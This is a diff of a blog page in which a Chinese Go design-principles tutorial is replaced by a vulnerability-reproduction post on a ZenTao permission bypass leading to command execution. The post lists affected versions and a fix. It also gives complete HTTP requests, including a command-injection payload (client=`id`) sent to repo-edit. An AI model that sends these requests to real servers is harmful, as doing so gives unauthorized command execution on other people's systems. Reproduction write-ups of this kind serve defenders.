@@ -3,9 +3,9 @@
 <meta name="referrer" content="no-referrer" />
 <head>
   <meta charset="utf-8">
-  <title>面向对象设计原则 | GoIruri</title>
-  <meta name="keywords" content=" Go , 设计模式 ">
-  <meta name="description" content="面向对象设计原则 | GoIruri">
+  <title>GoIruri</title>
+  <meta name="keywords" content=" 安全 , 漏洞复现 ">
+  <meta name="description" content="GoIruri">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="404">
@@ -442,9 +442,7 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-面向对象设计原则" class="article article-type-post" itemscope itemprop="blogPost">
-    
-        <h1 class="article-title">面向对象设计原则</h1>
+        <article id="post-禅道系统权限绕过与命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
     
     <div class="article-meta">
         
@@ -454,9 +452,9 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Go">Go</a> > 
+            <a  data-rel="安全">安全</a> > 
             
-            <a  data-rel="Go&lt;---&gt;设计模式">设计模式</a>
+            <a  data-rel="安全&lt;---&gt;漏洞复现">漏洞复现</a>
             
         </span>
         
@@ -464,21 +462,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">Go</a>
+            <a class="color3">安全</a>
             
-            <a class="color5">设计模式</a>
+            <a class="color5">漏洞复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-03-01 12:17:58'>2023-02-24 09:56</time>
+            发布时间 : <time class="date" title='最后更新: 2023-03-05 11:52:14'>2023-03-05 11:52</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:2.9k</span>
+        <span>字数:692</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -497,7 +495,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%E8%A1%A8"><span class="toc-text">面向对象设计原则表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%8C%E5%8D%95%E4%B8%80%E8%81%8C%E8%B4%A3%E5%8E%9F%E5%88%99"><span class="toc-text">1，单一职责原则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%8C%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99"><span class="toc-text">2，开闭原则</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%EF%BC%8C%E5%B9%B3%E9%93%BA%E5%BC%8F%E8%AE%BE%E8%AE%A1"><span class="toc-text">2.1，平铺式设计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2%EF%BC%8C%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99%E8%AE%BE%E8%AE%A1"><span class="toc-text">2.2，开闭原则设计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3%EF%BC%8C%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%84%8F%E4%B9%89"><span class="toc-text">2.3，接口的意义</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%8C%E4%BE%9D%E8%B5%96%E5%80%92%E8%BD%AC%E5%8E%9F%E5%88%99"><span class="toc-text">3，依赖倒转原则</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1%EF%BC%8C%E8%80%A6%E5%90%88%E5%BA%A6%E6%9E%81%E9%AB%98%E7%9A%84%E6%A8%A1%E5%9D%97%E5%85%B3%E7%B3%BB%E8%AE%BE%E8%AE%A1"><span class="toc-text">3.1，耦合度极高的模块关系设计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2%EF%BC%8C%E9%9D%A2%E5%90%91%E6%8A%BD%E8%B1%A1%E5%B1%82%E4%BE%9D%E8%B5%96%E5%80%92%E8%BD%AC"><span class="toc-text">3.2，面向抽象层依赖倒转</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%8C%E5%90%88%E6%88%90%E5%A4%8D%E7%94%A8%E5%8E%9F%E5%88%99"><span class="toc-text">4，合成复用原则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%EF%BC%8C%E8%BF%AA%E7%B1%B3%E7%89%B9%E6%B3%95%E5%88%99"><span class="toc-text">5，迪米特法则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">总结：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="toc-text">环境安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-text">修复方式</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -513,332 +511,77 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>对于面向对象软件系统的设计而言，在支持可维护性的同时，提高系统的可复用性是一个至关重要的问题，<strong>如何同时提高一个软件系统的可维护性和可复用性是面向对象设计需要解决的核心问题之一。</strong>在面向对象设计中，可维护性的复用是以设计原则为基础的。每一个原则都蕴含一些面向对象设计的思想，可以从不同的角度提升一个软件结构的设计水平。</p>
-<p><strong>面向对象设计原则为支持可维护性复用而诞生，这些原则蕴含在很多设计模式中，它们是从许多设计方案中总结出的指导性原则。</strong>面向对象设计原则也是我们用于评价一个设计模式的使用效果的重要指标之一。</p>
-<p>原则的目的： 高内聚，低耦合</p>
-<h3 id="面向对象设计原则表"><a href="#面向对象设计原则表" class="headerlink" title="面向对象设计原则表"></a>面向对象设计原则表</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/29334239/1677204533286-966d3ccb-056c-4954-863a-e62c0219a90a.png#averageHue=%23a3a3a2&clientId=u95279ef0-6f79-4&from=paste&height=602&id=ub38fa746&name=image.png&originHeight=1204&originWidth=1080&originalType=binary&ratio=2&rotation=0&showTitle=false&size=979476&status=done&style=none&taskId=u450260fa-eb20-4b4e-80aa-609cb832d55&title=&width=540" alt="image.png"></p>
-<h3 id="1，单一职责原则"><a href="#1，单一职责原则" class="headerlink" title="1，单一职责原则"></a>1，单一职责原则</h3><p>类的职责单一，对外只提供一种功能，而引起类变化的原因都应该只有一个。</p>
-<pre><code class="go">package main
+        <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul>
+<li>禅道是第一款国产的开源项目管理软件，它的核心管理思想基于敏捷方法scrum，内置了产品管理和项目管理，同时又根据国内研发现状补充了测试管理、计划管理、发布管理、文档管理、事务管理等功能，在一个软件中就可以将软件研发中的需求、任务、bug、用例、计划、发布等要素有序的跟踪管理起来，完整地覆盖了项目管理的核心流程。</li>
+</ul>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><ul>
+<li>禅道17.4以下版本存在权限绕过到命令执行漏洞。该漏洞是由于禅道项目管理系统权限认证存在缺陷导致，攻击者可利用该漏洞在未授权的情况下，通过权限绕过在服务器执行任意命令。</li>
+</ul>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><table>
+<thead>
+<tr>
+<th>企业版</th>
+<th>7.4以下的未知版本&lt;&#x3D;version&lt;&#x3D;8.0.beta1 8.0.beta2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>开源版</td>
+<td>17.4以下的未知版本&lt;&#x3D;version&lt;&#x3D;18.0.beta1</td>
+</tr>
+<tr>
+<td>旗舰版</td>
+<td>3.4以下的未知版本&lt;&#x3D;version&lt;&#x3D;4.0.beta1</td>
+</tr>
+</tbody></table>
+<h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><ul>
+<li>选择漏洞版本安装：<br><a target="_blank" rel="noopener" href="https://www.zentao.net/download/zentaopms18.0.beta1-81862.html">https://www.zentao.net/download/zentaopms18.0.beta1-81862.html</a></li>
+<li>安装文档：<br><a target="_blank" rel="noopener" href="https://www.zentao.net/book/zentaopmshelp/40.html">https://www.zentao.net/book/zentaopmshelp/40.html</a></li>
+</ul>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>1.首先依次发送如下两个请求，激活cookie信息：</p>
+<pre><code class="json">GET /misc-captcha-user.html HTTP/1.1
+Host: ******
+Accept-Language: zh-CN,zh;q=0.9
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Connection: keep-alive
+Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=default
 
-import &quot;fmt&quot;
 
-type ClothesShop struct &#123;&#125;
+POST /repo-create.html HTTP/1.1
+Host: ******
+Content-Length: 113
+Accept-Language: zh-CN,zh;q=0.9
+Accept-Encoding: gzip, deflate
+Referer: http://******//repo-edit-1-0.html
+Accept: */*
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Connection: keep-alive
+X-Requested-With: XMLHttpRequest
+Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=default
+Content-Type: application/x-www-form-urlencoded
 
-func (cs *ClothesShop) OnShop() &#123;
-    fmt.Println(&quot;休闲的装扮&quot;)
-&#125;
-
-type ClothesWork struct &#123;&#125;
-
-func (cw *ClothesWork) OnWork() &#123;
-    fmt.Println(&quot;工作的装扮&quot;)
-&#125;
-
-func main() &#123;
-    //工作的时候
-    cw := new(ClothesWork)
-    cw.OnWork()
-
-    //shopping的时候
-    cs := new(ClothesShop)
-    cs.OnShop()
-&#125;
+product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=
 </code></pre>
-<p>在面向对象编程的过程中，设计一个类，建议对外提供的功能单一，接口单一，影响一个类的范围就只限定在这一个接口上，一个类的一个接口具备这个类的功能含义，职责单一不复杂。</p>
-<h3 id="2，开闭原则"><a href="#2，开闭原则" class="headerlink" title="2，开闭原则"></a>2，开闭原则</h3><h4 id="2-1，平铺式设计"><a href="#2-1，平铺式设计" class="headerlink" title="2.1，平铺式设计"></a>2.1，平铺式设计</h4><p>首先看一个例子：</p>
-<pre><code class="go">package main
+<p>2.发送如下请求，如果存在漏洞，则返回包中会包含命令执行的结果</p>
+<pre><code class="json">POST /repo-edit-10000-10000.html HTTP/1.1
+Host: ******
+Content-Length: 26
+Accept-Language: zh-CN,zh;q=0.9
+Accept-Encoding: gzip, deflate
+Referer: http://******//repo-edit-1-0.html
+Accept: */*
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Connection: keep-alive
+X-Requested-With: XMLHttpRequest
+Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2;; device=desktop; theme=default
+Content-Type: application/x-www-form-urlencoded
 
-import &quot;fmt&quot;
-
-//我们要写一个类,Banker银行业务员
-type Banker struct &#123;
-&#125;
-
-//存款业务
-func (this *Banker) Save() &#123;
-    fmt.Println( &quot;进行了 存款业务...&quot;)
-&#125;
-
-//转账业务
-func (this *Banker) Transfer() &#123;
-    fmt.Println( &quot;进行了 转账业务...&quot;)
-&#125;
-
-//支付业务
-func (this *Banker) Pay() &#123;
-    fmt.Println( &quot;进行了 支付业务...&quot;)
-&#125;
-
-func main() &#123;
-    banker := &amp;Banker&#123;&#125;
-
-    banker.Save()
-    banker.Transfer()
-    banker.Pay()
-&#125;
+SCM=Subversion&amp;client=`id`
 </code></pre>
-<p>代码很简单，就是一个银行业务员，他可能拥有很多的业务，比如<code>Save()</code>存款、<code>Transfer()</code>转账、<code>Pay()</code>支付等。那么如果这个业务员模块只有这几个方法还好，但是随着我们的程序写的越来越复杂，银行业务员可能就要增加方法，会导致业务员模块越来越臃肿。<br>这样的设计会导致，当我们去给Banker添加新的业务的时候，会直接修改原有的Banker代码，那么Banker模块的功能会越来越多，出现问题的几率也就越来越大，假如此时Banker已经有99个业务了，现在我们要添加第100个业务，可能由于一次的不小心，导致之前99个业务也一起崩溃，因为所有的业务都在一个Banker类里，他们的耦合度太高，Banker的职责也不够单一，代码的维护成本随着业务的复杂正比成倍增大。</p>
-<h4 id="2-2，开闭原则设计"><a href="#2-2，开闭原则设计" class="headerlink" title="2.2，开闭原则设计"></a>2.2，开闭原则设计</h4><p>那么，如果我们拥有接口, <code>interface</code>这个东西，那么我们就可以抽象一层出来，制作一个抽象的Banker模块，然后提供一个抽象的方法。 分别根据这个抽象模块，去实现<code>支付Banker（实现支付方法）</code>,<code>转账Banker（实现转账方法）</code><br>如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29334239/1677205247527-817266c4-0e54-4458-952a-f7888b20e91a.png#averageHue=%23faf9f7&clientId=u95279ef0-6f79-4&from=paste&height=447&id=u5aaa3b99&name=image.png&originHeight=894&originWidth=1478&originalType=binary&ratio=2&rotation=0&showTitle=false&size=224043&status=done&style=none&taskId=ue7822eda-2190-49e1-99e3-b6caa9cc928&title=&width=739" alt="image.png"><br>那么依然可以搞定程序的需求。 然后，当我们想要给Banker添加额外功能的时候，之前我们是直接修改Banker的内容，现在我们可以单独定义一个<code>股票Banker(实现股票方法)</code>，到这个系统中。 而且股票Banker的实现成功或者失败都不会影响之前的稳定系统，他很单一，而且独立。</p>
-<p>所以以上，当我们给一个系统添加一个功能的时候，不是通过修改代码，而是通过增添代码来完成，那么就是开闭原则的核心思想了。所以要想满足上面的要求，是一定需要interface来提供一层抽象的接口的。<br>代码实现如下：</p>
-<pre><code class="go">package main
-
-import &quot;fmt&quot;
-
-//抽象的银行业务员
-type AbstractBanker interface&#123;
-    DoBusi()	//抽象的处理业务接口
-&#125;
-
-//存款的业务员
-type SaveBanker struct &#123;
-    //AbstractBanker
-&#125;
-
-func (sb *SaveBanker) DoBusi() &#123;
-    fmt.Println(&quot;进行了存款&quot;)
-&#125;
-
-//转账的业务员
-type TransferBanker struct &#123;
-    //AbstractBanker
-&#125;
-
-func (tb *TransferBanker) DoBusi() &#123;
-    fmt.Println(&quot;进行了转账&quot;)
-&#125;
-
-//支付的业务员
-type PayBanker struct &#123;
-    //AbstractBanker
-&#125;
-
-func (pb *PayBanker) DoBusi() &#123;
-    fmt.Println(&quot;进行了支付&quot;)
-&#125;
-
-
-func main() &#123;
-    //进行存款
-    sb := &amp;SaveBanker&#123;&#125;
-    sb.DoBusi()
-
-    //进行转账
-    tb := &amp;TransferBanker&#123;&#125;
-    tb.DoBusi()
-    
-    //进行支付
-    pb := &amp;PayBanker&#123;&#125;
-    pb.DoBusi()
-
-&#125;
-</code></pre>
-<p>当然我们也可以根据<code>AbstractBanker</code>设计一个小框架</p>
-<pre><code class="go">//实现架构层(基于抽象层进行业务封装-针对interface接口进行封装)
-func BankerBusiness(banker AbstractBanker) &#123;
-    //通过接口来向下调用，(多态现象)
-    banker.DoBusi()
-&#125;
-</code></pre>
-<p>那么main中可以如下实现业务调用:</p>
-<pre><code class="go">func main() &#123;
-    //进行存款
-    BankerBusiness(&amp;SaveBanker&#123;&#125;)
-
-    //进行存款
-    BankerBusiness(&amp;TransferBanker&#123;&#125;)
-
-    //进行存款
-    BankerBusiness(&amp;PayBanker&#123;&#125;)
-&#125;
-</code></pre>
-<p>再看开闭原则定义:<br>开闭原则:一个软件实体如类、模块和函数应该对扩展开放，对修改关闭。<br>简单的说就是在修改需求的时候，应该尽量通过扩展来实现变化，而不是通过修改已有代码来实现变化。</p>
-<h4 id="2-3，接口的意义"><a href="#2-3，接口的意义" class="headerlink" title="2.3，接口的意义"></a>2.3，接口的意义</h4><p>好了，现在interface已经基本了解，那么接口的意义最终在哪里呢，想必现在你已经有了一个初步的认知，实际上接口的最大的意义就是实现多态的思想，就是我们可以根据interface类型来设计API接口，那么这种API接口的适应能力不仅能适应当下所实现的全部模块，也适应未来实现的模块来进行调用。 <code>调用未来</code>可能就是接口的最大意义所在吧，这也是为什么架构师那么值钱，因为良好的架构师是可以针对interface设计一套框架，在未来许多年却依然适用。</p>
-<h3 id="3，依赖倒转原则"><a href="#3，依赖倒转原则" class="headerlink" title="3，依赖倒转原则"></a>3，依赖倒转原则</h3><h4 id="3-1，耦合度极高的模块关系设计"><a href="#3-1，耦合度极高的模块关系设计" class="headerlink" title="3.1，耦合度极高的模块关系设计"></a>3.1，耦合度极高的模块关系设计</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/29334239/1677205523921-b2a43f6e-5c25-434f-8fe3-32eeb8a7beeb.png#averageHue=%23fbfbfb&clientId=u95279ef0-6f79-4&from=paste&height=469&id=u423d3dec&name=image.png&originHeight=938&originWidth=1450&originalType=binary&ratio=2&rotation=0&showTitle=false&size=170865&status=done&style=none&taskId=uf6d724ba-2f5b-44c5-8c0c-49595cf663f&title=&width=725" alt="image.png"></p>
-<pre><code class="go">package main
-
-import &quot;fmt&quot;
-
-// === &gt; 奔驰汽车 &lt;===
-type Benz struct &#123;
-
-&#125;
-
-func (this *Benz) Run() &#123;
-    fmt.Println(&quot;Benz is running...&quot;)
-&#125;
-
-// === &gt; 宝马汽车  &lt;===
-type BMW struct &#123;
-
-&#125;
-
-func (this *BMW) Run() &#123;
-    fmt.Println(&quot;BMW is running ...&quot;)
-&#125;
-
-
-//===&gt; 司机张三  &lt;===
-type Zhang3 struct &#123;
-    //...
-&#125;
-
-func (zhang3 *Zhang3) DriveBenZ(benz *Benz) &#123;
-    fmt.Println(&quot;zhang3 Drive Benz&quot;)
-    benz.Run()
-&#125;
-
-func (zhang3 *Zhang3) DriveBMW(bmw *BMW) &#123;
-    fmt.Println(&quot;zhang3 drive BMW&quot;)
-    bmw.Run()
-&#125;
-
-//===&gt; 司机李四 &lt;===
-type Li4 struct &#123;
-    //...
-&#125;
-
-func (li4 *Li4) DriveBenZ(benz *Benz) &#123;
-    fmt.Println(&quot;li4 Drive Benz&quot;)
-    benz.Run()
-&#125;
-
-func (li4 *Li4) DriveBMW(bmw *BMW) &#123;
-    fmt.Println(&quot;li4 drive BMW&quot;)
-    bmw.Run()
-&#125;
-
-func main() &#123;
-    //业务1 张3开奔驰
-    benz := &amp;Benz&#123;&#125;
-    zhang3 := &amp;Zhang3&#123;&#125;
-    zhang3.DriveBenZ(benz)
-
-    //业务2 李四开宝马
-    bmw := &amp;BMW&#123;&#125;
-    li4 := &amp;Li4&#123;&#125;
-    li4.DriveBMW(bmw)
-&#125;
-</code></pre>
-<p>我们来看上面的代码和图中每个模块之间的依赖关系，实际上并没有用到任何的<code>interface</code>接口层的代码，显然最后我们的两个业务 <code>张三开奔驰</code>, <code>李四开宝马</code>，程序中也都实现了。但是这种设计的问题就在于，小规模没什么问题，但是一旦程序需要扩展，比如我现在要增加一个<code>丰田汽车</code> 或者 司机<code>王五</code>， 那么模块和模块的依赖关系将成指数级递增，想蜘蛛网一样越来越难维护和捋顺。</p>
-<h4 id="3-2，面向抽象层依赖倒转"><a href="#3-2，面向抽象层依赖倒转" class="headerlink" title="3.2，面向抽象层依赖倒转"></a>3.2，面向抽象层依赖倒转</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/29334239/1677205684401-349f499e-9360-413a-92be-a1f5c97663a3.png#averageHue=%23f8f8f8&clientId=u95279ef0-6f79-4&from=paste&height=476&id=u91a01560&name=image.png&originHeight=952&originWidth=1512&originalType=binary&ratio=2&rotation=0&showTitle=false&size=253250&status=done&style=none&taskId=u07ce5146-c574-46c5-ab98-2d8704b4550&title=&width=756" alt="image.png"><br>如上图所示，如果我们在设计一个系统的时候，将模块分为3个层次，抽象层、实现层、业务逻辑层。那么，我们首先将抽象层的模块和接口定义出来，这里就需要了<code>interface</code>接口的设计，然后我们依照抽象层，依次实现每个实现层的模块，在我们写实现层代码的时候，实际上我们只需要参考对应的抽象层实现就好了，实现每个模块，也和其他的实现的模块没有关系，这样也符合了上面介绍的开闭原则。这样实现起来每个模块只依赖对象的接口，而和其他模块没关系，依赖关系单一。系统容易扩展和维护。</p>
-<p>我们在指定业务逻辑也是一样，只需要参考抽象层的接口来业务就好了，抽象层暴露出来的接口就是我们业务层可以使用的方法，然后可以通过多态的线下，接口指针指向哪个实现模块，调用了就是具体的实现方法，这样我们业务逻辑层也是依赖抽象成编程。</p>
-<p>我们就将这种的设计原则叫做<code>依赖倒转原则</code>。</p>
-<p>代码如下：</p>
-<pre><code class="go">package main
-
-import &quot;fmt&quot;
-
-// ===== &gt;   抽象层  &lt; ========
-type Car interface &#123;
-    Run()
-&#125;
-
-type Driver interface &#123;
-    Drive(car Car)
-&#125;
-
-// ===== &gt;   实现层  &lt; ========
-type BenZ struct &#123;
-    //...
-&#125;
-
-func (benz * BenZ) Run() &#123;
-    fmt.Println(&quot;Benz is running...&quot;)
-&#125;
-
-type Bmw struct &#123;
-    //...
-&#125;
-
-func (bmw * Bmw) Run() &#123;
-    fmt.Println(&quot;Bmw is running...&quot;)
-&#125;
-
-type Zhang_3 struct &#123;
-    //...
-&#125;
-
-func (zhang3 *Zhang_3) Drive(car Car) &#123;
-    fmt.Println(&quot;Zhang3 drive car&quot;)
-    car.Run()
-&#125;
-
-type Li_4 struct &#123;
-    //...
-&#125;
-
-func (li4 *Li_4) Drive(car Car) &#123;
-    fmt.Println(&quot;li4 drive car&quot;)
-    car.Run()
-&#125;
-
-
-// ===== &gt;   业务逻辑层  &lt; ========
-func main() &#123;
-    //张3 开 宝马
-    var bmw Car
-    bmw = &amp;Bmw&#123;&#125;
-
-    var zhang3 Driver
-    zhang3 = &amp;Zhang_3&#123;&#125;
-
-    zhang3.Drive(bmw)
-
-    //李4 开 奔驰
-    var benz Car
-    benz = &amp;BenZ&#123;&#125;
-
-    var li4 Driver
-    li4 = &amp;Li_4&#123;&#125;
-
-    li4.Drive(benz)
-&#125;
-</code></pre>
-<h3 id="4，合成复用原则"><a href="#4，合成复用原则" class="headerlink" title="4，合成复用原则"></a>4，合成复用原则</h3><p>如果使用继承，会导致父类的任何变换都可能影响到子类的行为。如果使用对象组合，就降低了这种依赖关系。对于继承和组合，优先使用组合。</p>
-<pre><code class="go">package main
-
-import &quot;fmt&quot;
-
-type Cat struct &#123;&#125;
-
-func (c *Cat) Eat() &#123;
-    fmt.Println(&quot;小猫吃饭&quot;)
-&#125;
-
-//给小猫添加一个 可以睡觉的方法 （使用继承来实现）
-type CatB struct &#123;
-    Cat
-&#125;
-
-func (cb *CatB) Sleep() &#123;
-    fmt.Println(&quot;小猫睡觉&quot;)
-&#125;
-
-//给小猫添加一个 可以睡觉的方法 （使用组合的方式）
-type CatC struct &#123;
-    C *Cat
-&#125;
-
-func (cc *CatC) Sleep() &#123;
-    fmt.Println(&quot;小猫睡觉&quot;)
-&#125;
-
-
-func main() &#123;
-    //通过继承增加的功能，可以正常使用
-    cb := new(CatB)
-    cb.Eat()
-    cb.Sleep()
-
-    //通过组合增加的功能，可以正常使用
-    cc := new(CatC)
-    cc.C = new(Cat)
-    cc.C.Eat()
-    cc.Sleep()
-&#125;
-</code></pre>
-<h3 id="5，迪米特法则"><a href="#5，迪米特法则" class="headerlink" title="5，迪米特法则"></a>5，迪米特法则</h3><p>1，和陌生人说话<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29334239/1677206018410-4d923b37-2ccb-46ab-85dc-4cfcd980c9b4.png#averageHue=%23c0e1e4&clientId=u95279ef0-6f79-4&from=paste&height=213&id=ue2573578&name=image.png&originHeight=426&originWidth=776&originalType=binary&ratio=2&rotation=0&showTitle=false&size=40923&status=done&style=none&taskId=u4d422e87-7e4d-49e2-a185-752ebecb5c5&title=&width=388" alt="image.png"><br>2，不和陌生人说话<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29334239/1677206044401-bb7c443b-ce08-4d25-bd3d-d06f3788ee52.png#averageHue=%23c1e1e4&clientId=u95279ef0-6f79-4&from=paste&height=198&id=ua042c93a&name=image.png&originHeight=396&originWidth=730&originalType=binary&ratio=2&rotation=0&showTitle=false&size=24678&status=done&style=none&taskId=u128fd855-c703-4f15-b8c0-7b8fa382681&title=&width=365" alt="image.png"><br>3，与依赖倒转原则结合 某人和 抽象陌生人说话  让某人和陌生人进行解耦合<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29334239/1677206077614-ce9276ed-867e-4b92-97cf-7188a2dfa180.png#averageHue=%23fefffe&clientId=u95279ef0-6f79-4&from=paste&height=226&id=u5addb836&name=image.png&originHeight=452&originWidth=834&originalType=binary&ratio=2&rotation=0&showTitle=false&size=38237&status=done&style=none&taskId=uc6f94b79-f915-4cde-99ad-4f04375024a&title=&width=417" alt="image.png"><br>迪米特法则：依赖第三方来实现解耦</p>
-<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>单一职责原则：一个类对外只提供一种功能<br>开闭原则：增加功能时去增加代码而不是修改代码<br>依赖倒转原则：模块与模块依赖抽象而不是具体实现<br>合成复用原则：通过组合来实现父类方法<br>迪米特法则：依赖第三方来实现解耦</p>
+<p>命令执行结果<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29334239/1677988228317-d74943d4-dd54-4a93-8ce9-14de2c388932.png#averageHue=%23f0ecec&clientId=u08b105f6-fabe-4&from=paste&height=85&id=u96f6d8e3&name=image.png&originHeight=170&originWidth=662&originalType=binary&ratio=2&rotation=0&showTitle=false&size=57300&status=done&style=none&taskId=ua9211574-0f0a-4afe-808c-fbf08ff85c1&title=&width=331" alt="image.png"></p>
+<h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><p>目前禅道官方已正式发布修复版本，建议受影响用户尽快升级至安全版本。</p>
+<p>如不能升级，可在module&#x2F;common&#x2F;model.php文件中的echo $endResponseException-&gt;getContent();后面加上exit(); 来修复权限绕过漏洞。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1174511382@qq.com </span>
